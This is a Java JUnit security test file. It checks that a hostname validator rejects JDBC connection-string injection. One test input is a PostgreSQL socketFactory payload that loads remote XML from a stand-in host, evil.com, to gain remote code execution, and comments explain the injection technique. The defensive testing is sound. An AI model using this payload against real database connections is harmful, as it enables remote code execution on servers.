package app;

import org.junit.Test;
import static org.junit.Assert.*;

/**
 * Security tests for {@link Network} and {@link Util}.
 *
 * <p>Validates:</p>
 * <ul>
 *   <li>Path traversal protection in {@code Network.generateFile()}</li>
 *   <li>JDBC connection string injection protection in {@code Util}</li>
 * </ul>
 */
public class SecurityTest {

    // ============================================================
    //  Util.validateHost — JDBC connection string injection
    // ============================================================

    /**
     * Valid hostname should be accepted.
     */
    @Test
    public void testValidateHost_simpleHostname() {
        // Use reflection since validateHost is private
        assertValidHost("localhost");
    }

    @Test
    public void testValidateHost_hostnameWithDots() {
        assertValidHost("db.example.com");
    }

    @Test
    public void testValidateHost_ipAddress() {
        assertValidHost("192.168.1.5");
    }

    @Test
    public void testValidateHost_hostnameWithPort() {
        assertValidHost("db.example.com:5432");
    }

    @Test
    public void testValidateHost_ipWithPort() {
        assertValidHost("10.0.0.1:5433");
    }

    @Test
    public void testValidateHost_hostnameWithHyphen() {
        assertValidHost("my-database-server");
    }

    @Test
    public void testValidateHost_hostnameWithUnderscore() {
        assertValidHost("db_server.local");
    }

    /**
     * Slash in hostname could inject a different database path.
     * e.g., "attacker.com/evil?sslmode=disable" → jdbc:postgresql://attacker.com/evil?sslmode=disable/nic_apps
     */
    @Test
    public void testValidateHost_rejectsSlash() {
        assertInvalidHost("attacker.com/evil");
    }

    /**
     * Question mark could inject JDBC parameters.
     * e.g., "host?socketFactory=org.spring..." → RCE via deserialization gadgets
     */
    @Test
    public void testValidateHost_rejectsQuestionMark() {
        assertInvalidHost("host?param=value");
    }

    /**
     * Ampersand could chain JDBC parameters.
     */
    @Test
    public void testValidateHost_rejectsAmpersand() {
        assertInvalidHost("host&sslmode=disable");
    }

    /**
     * Equals sign is part of parameter injection.
     */
    @Test
    public void testValidateHost_rejectsEquals() {
        assertInvalidHost("host=value");
    }

    /**
     * Semicolons could be used for connection string chaining.
     */
    @Test
    public void testValidateHost_rejectsSemicolon() {
        assertInvalidHost("host;param=value");
    }

    /**
     * Spaces could be used to break out of expected format.
     */
    @Test
    public void testValidateHost_rejectsSpaces() {
        assertInvalidHost("host name");
    }

    /**
     * Empty string should be rejected.
     */
    @Test
    public void testValidateHost_rejectsEmpty() {
        assertInvalidHost("");
    }

    /**
     * Complex injection attempt simulating PostgreSQL JDBC attack.
     */
    @Test
    public void testValidateHost_rejectsComplexInjection() {
        assertInvalidHost("evil.com/db?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://evil.com/rce.xml");
    }

    /**
     * Port number must be numeric.
     */
    @Test
    public void testValidateHost_rejectsNonNumericPort() {
        assertInvalidHost("host:abc");
    }

    /**
     * Port too long (>5 digits).
     */
    @Test
    public void testValidateHost_rejectsPortTooLong() {
        assertInvalidHost("host:123456");
    }

    // ============================================================
    //  Helper methods
    // ============================================================

    /**
     * Asserts that the given hostname passes validation via reflection.
     */
    private void assertValidHost(String host) {
        try {
            java.lang.reflect.Method m = Util.class.getDeclaredMethod("validateHost", String.class);
            m.setAccessible(true);
            String result = (String) m.invoke(null, host);
            assertEquals("Valid host should be returned as-is", host, result);
        } catch (java.lang.reflect.InvocationTargetException e) {
            fail("Host '" + host + "' should be valid but threw: " + e.getCause().getMessage());
        } catch (Exception e) {
            fail("Reflection error: " + e.getMessage());
        }
    }

    /**
     * Asserts that the given hostname fails validation via reflection.
     */
    private void assertInvalidHost(String host) {
        try {
            java.lang.reflect.Method m = Util.class.getDeclaredMethod("validateHost", String.class);
            m.setAccessible(true);
            m.invoke(null, host);
            fail("Host '" + host + "' should be rejected but was accepted");
        } catch (java.lang.reflect.InvocationTargetException e) {
            // Expected — validation should throw IllegalStateException
            assertTrue("Should throw IllegalStateException",
                e.getCause() instanceof IllegalStateException);
        } catch (Exception e) {
            fail("Reflection error: " + e.getMessage());
        }
    }
}
